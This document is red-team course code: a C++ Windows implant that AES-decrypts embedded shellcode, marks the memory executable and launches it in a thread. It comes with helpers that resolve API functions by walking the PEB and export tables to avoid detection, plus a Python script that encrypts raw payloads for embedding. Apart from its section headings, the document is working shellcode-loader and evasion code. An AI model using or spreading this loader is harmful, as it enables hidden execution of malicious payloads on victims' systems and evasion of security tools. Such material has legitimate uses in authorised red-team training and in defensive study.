#### Implant

```cpp
/*

 Red Team Operator course code template
 PE binary - payload encryption with AES
 author: reenz0h (twitter: @SEKTOR7net)

*/

  

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

#include <psapi.h>
#include "helpers.h"

  

typedef LPVOID (WINAPI * VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef VOID (WINAPI * RtlMoveMemory_t)(VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
  
    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
            return -1;
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
            return -1;
    }
    
    if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
            return -1;              
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
            return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
            return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;

}

  

// 64-bit notepad

unsigned char payload[] = { 0xf7, 0xbb, 0x71, 0x51, 0xf6, 0x7f, 0x93, 0x50, 0x2a, 0x25, 0xba, 0x2d, 0x99, 0x65, 0x6e, 0xe6, 0x62, 0x56, 0xc0, 0x97, 0x84, 0xe7, 0xd0, 0xcb, 0x5b, 0xa7, 0x6c, 0x25, 0xd4, 0x6a, 0x47, 0xbf, 0x2e, 0xec, 0x6a, 0x20, 0x9a, 0xab, 0x62, 0xcf, 0x53, 0xc9, 0x37, 0xc3, 0x65, 0x32, 0xd5, 0xca, 0x82, 0xc2, 0xaf, 0x67, 0x8f, 0x5d, 0x6, 0x3f, 0x5d, 0x6e, 0xf4, 0x45, 0xfa, 0xb2, 0x76, 0xb, 0x66, 0x69, 0x10, 0x60, 0x75, 0x34, 0xa8, 0xbc, 0xae, 0xd4, 0x49, 0x22, 0xaf, 0xb9, 0xf8, 0x67, 0x68, 0xfc, 0x66, 0xf, 0x25, 0x79, 0x94, 0xd1, 0x12, 0x7c, 0x62, 0xe0, 0x5, 0x50, 0xce, 0x18, 0x4f, 0xa2, 0xc, 0xf2, 0xce, 0xf, 0x3f, 0xe, 0x30, 0xce, 0x65, 0x44, 0xbb, 0x4d, 0xce, 0x6a, 0x92, 0x38, 0xd, 0x1f, 0x2c, 0xbb, 0xb9, 0x5d, 0xa9, 0xe3, 0x49, 0x92, 0xf, 0x11, 0x20, 0x6b, 0x93, 0x52, 0xa5, 0xe2, 0xfb, 0xd2, 0xd5, 0x14, 0xe6, 0xc3, 0x3e, 0xe, 0x28, 0x54, 0x2, 0x64, 0x59, 0xd6, 0x37, 0xd3, 0x6d, 0x4b, 0x37, 0x34, 0x48, 0x3b, 0x5e, 0x69, 0xe0, 0x48, 0xb4, 0x9c, 0x3e, 0xb3, 0xef, 0x67, 0x81, 0x26, 0xac, 0xd0, 0x19, 0xff, 0x33, 0x72, 0x58, 0x3e, 0xbb, 0xd7, 0x71, 0xc7, 0xe6, 0x77, 0x39, 0x36, 0x7b, 0xd9, 0x22, 0x8d, 0x2e, 0x33, 0xc8, 0x67, 0x7, 0x49, 0xb0, 0x6d, 0xea, 0x6c, 0xcf, 0x2b, 0x6d, 0x56, 0x4b, 0x7d, 0xf3, 0xab, 0x18, 0x68, 0xcb, 0xee, 0xee, 0x34, 0x82, 0x93, 0x23, 0x3b, 0x4c, 0x1d, 0xa8, 0xde, 0x97, 0xd4, 0xd5, 0x89, 0xd2, 0x2e, 0xd5, 0x47, 0xa9, 0xc4, 0x91, 0x99, 0x4a, 0x74, 0x9d, 0x28, 0xfe, 0x6a, 0x8, 0x51, 0x7e, 0x5b, 0x21, 0xc9, 0x83, 0x0, 0x85, 0xe0, 0x81, 0x70, 0xc1, 0x1, 0xe0, 0xc8, 0x77, 0xb8, 0xed, 0xdb, 0xb5, 0x93, 0xb3, 0x8f, 0x7d, 0xb7, 0xba, 0x20, 0x1e, 0x6d, 0x37, 0x82, 0xef, 0xb3, 0x43, 0xf1, 0x70, 0xd4, 0x16, 0xed, 0xf7, 0x80, 0xda, 0xb8, 0x1b, 0x39, 0x62, 0x95, 0xce, 0xd7, 0x9a, 0x1d };

unsigned char key[] = { 0xca, 0x93, 0x8a, 0xff, 0xa6, 0x69, 0x92, 0x9c, 0x4a, 0xce, 0x9d, 0x11, 0xf5, 0x38, 0x72, 0x9f };

  
  

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    
    // resolve functions addresses
    //VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "VirtualAlloc");  
    //RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "RtlMoveMemory");
    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
  
    unsigned int payload_len = sizeof(payload);
    
    // Allocate memory for payload
    exec_mem = pVirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

    // Copy payload to allocated buffer
    pRtlMoveMemory(exec_mem, payload, payload_len);
    
    // Make the buffer executable
    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    // If all good, launch the payload
    if ( rv != 0 ) {
            th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
            WaitForSingleObject(th, -1);
    }

    return 0;

}
```

#### Process Environment Block
```cpp
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

#### helpers.cpp
```cpp
/*
 Red Team Operator helper functions

 author: reenz0h (twitter: @SEKTOR7net)
 credits: zerosum0x0, speedi13

*/

#include "PEstructs.h"
#include "helpers.h"
#include <stdio.h>

typedef HMODULE (WINAPI * LoadLibrary_t)(LPCSTR lpFileName);
LoadLibrary_t pLoadLibraryA = NULL;

HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {
    // get the offset of Process Environment Block
#ifdef _M_IX86
    PEB * ProcEnvBlk = (PEB *) __readfsdword(0x30);
#else
    PEB * ProcEnvBlk = (PEB *)__readgsqword(0x60);
#endif

    // return base address of a calling module
    if (sModuleName == NULL)
        return (HMODULE) (ProcEnvBlk->ImageBaseAddress);

    PEB_LDR_DATA * Ldr = ProcEnvBlk->Ldr;
    LIST_ENTRY * ModuleList = NULL;
    ModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *  pStartListEntry = ModuleList->Flink;

    for (LIST_ENTRY *  pListEntry  = pStartListEntry;       // start from beginning of InMemoryOrderModuleList
                       pListEntry != ModuleList;            // walk all list entries
                       pListEntry  = pListEntry->Flink) {
                       
        // get current Data Table Entry
        LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));
        
        // check if module is found and return its base address
        if (lstrcmpiW(pEntry->BaseDllName.Buffer, sModuleName) == 0)
            return (HMODULE) pEntry->DllBase;
    }

    // otherwise:
    return NULL;
}

FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char * sProcName) {

    char * pBaseAddr = (char *) hMod;

    // get pointers to main headers/structures
    IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pBaseAddr;
    IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pBaseAddr + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
    IMAGE_DATA_DIRECTORY * pExportDataDir = (IMAGE_DATA_DIRECTORY *) (&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    IMAGE_EXPORT_DIRECTORY * pExportDirAddr = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pExportDataDir->VirtualAddress);

    // resolve addresses to Export Address Table, table of function names and "table of ordinals"
    DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfFunctions);
    DWORD * pFuncNameTbl = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfNames);
    WORD * pHintsTbl = (WORD *) (pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

    // function address we're looking for
    void *pProcAddr = NULL;

    // resolve function by ordinal
    if (((DWORD_PTR)sProcName >> 16) == 0) {
        WORD ordinal = (WORD) sProcName & 0xFFFF;   // convert to WORD
        DWORD Base = pExportDirAddr->Base;          // first ordinal number

        // check if ordinal is not out of scope
        if (ordinal < Base || ordinal >= Base + pExportDirAddr->NumberOfFunctions)
            return NULL;

        // get the function virtual address = RVA + BaseAddr
        pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[ordinal - Base]);
    }
    // resolve function by name
    else {
        // parse through table of function names
        for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
            char * sTmpFuncName = (char *) pBaseAddr + (DWORD_PTR) pFuncNameTbl[i];
            if (strcmp(sProcName, sTmpFuncName) == 0)   {
                
                // found, get the function virtual address = RVA + BaseAddr
                pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[pHintsTbl[i]]);
                break;
            }
        }
    }

    // check if found VA is forwarded to external library.function
    if ((char *) pProcAddr >= (char *) pExportDirAddr &&
        (char *) pProcAddr < (char *) (pExportDirAddr + pExportDataDir->Size)) {
        char * sFwdDLL = _strdup((char *) pProcAddr);   // get a copy of library.function string
        
        if (!sFwdDLL) return NULL;
        
        // get external function name
        char * sFwdFunction = strchr(sFwdDLL, '.');
        *sFwdFunction = 0;                  // set trailing null byte for external library name -> library\x0function
        sFwdFunction++;                     // shift a pointer to the beginning of function name

        // resolve LoadLibrary function pointer, keep it as global variable
        if (pLoadLibraryA == NULL) {
            pLoadLibraryA = (LoadLibrary_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
            if (pLoadLibraryA == NULL) return NULL;
        }

  

        // load the external library
        HMODULE hFwd = pLoadLibraryA(sFwdDLL);
        free(sFwdDLL);                          // release the allocated memory for lib.func string copy
        if (!hFwd) return NULL;

        // get the address of function the original call is forwarded to
        pProcAddr = hlpGetProcAddress(hFwd, sFwdFunction);
    }
    
    return (FARPROC) pProcAddr;
}
```

#### PEstructs.h
```cpp

#pragma once
#include <windows.h>

//https://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html#l00063
struct PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
};

//https://processhacker.sourceforge.io/doc/ntpebteb_8h_source.html#l00008
struct PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN SpareBits : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PEB_LDR_DATA* Ldr;
    //...
};

struct UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWCH Buffer;
};

//https://processhacker.sourceforge.io/doc/ntldr_8h_source.html#l00102
struct LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    union
    {
        LIST_ENTRY InInitializationOrderLinks;
        LIST_ENTRY InProgressLinks;
    };
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    //...
};
```

#### aes.py
```python
# Red Team Operator course code template
# payload encryption with AES
#
# author: reenz0h (twitter: @SEKTOR7net)

import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    plaintext = open(sys.argv[1], "rb").read()

except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
```